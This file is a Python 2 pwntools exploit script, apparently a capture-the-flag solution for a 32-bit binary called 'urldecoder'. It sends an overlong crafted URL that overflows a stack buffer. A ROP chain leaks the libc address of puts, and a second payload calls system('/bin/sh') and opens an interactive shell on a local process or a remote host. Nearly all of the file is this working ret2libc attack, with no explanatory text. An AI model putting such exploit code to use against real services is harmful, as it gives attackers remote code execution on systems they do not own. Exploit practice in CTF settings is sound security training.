#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

#context.log_level = 'debug'

binary = './urldecoder'
LIBC = './libc-2.13.so'
LIBC = '/lib/i386-linux-gnu/libc.so.6'

e = ELF(binary)
e.checksec()

libc = ELF(LIBC)

if 'HOST' in args:
  io = remote(args['HOST'], int(args['PORT']))
else:
  io = process(binary)
  #gdb.attach(io, '''
  #  continue
  #''')



puts_plt = e.plt['puts'] 
puts_got = e.got['puts'] 
main_addr = 0x08048590

PUTS_LIBC = libc.symbols['puts'] 
SYSTEM_LIBC = libc.symbols['system'] 
BINSH_LIBC = next(libc.search('/bin/sh\x00')) 

#pause()

url = 'http://anycast%\x00' + 'c'*142
url += pack(puts_plt) + pack(main_addr) + pack(puts_got)
assert('\n' not in url)
io.recvuntil('URL:')
io.sendline(url)
io.recvuntil('Decode Result:')
io.readline()

puts_addr = unpack(io.recv(4))
print 'puts_addr', hex(puts_addr)

libc_base = puts_addr - PUTS_LIBC
libc_system = libc_base + SYSTEM_LIBC
libc_binsh = libc_base + BINSH_LIBC
print 'libc_base:', hex(libc_base)
print 'libc_system:', hex(libc_system)
print 'libc_binsh:', hex(libc_binsh)

url = 'http://anycast%\x00' + 'a'*142
url += pack(libc_system) + pack(main_addr) + pack(libc_binsh)
assert('\n' not in url)

io.sendline(url)
io.interactive()

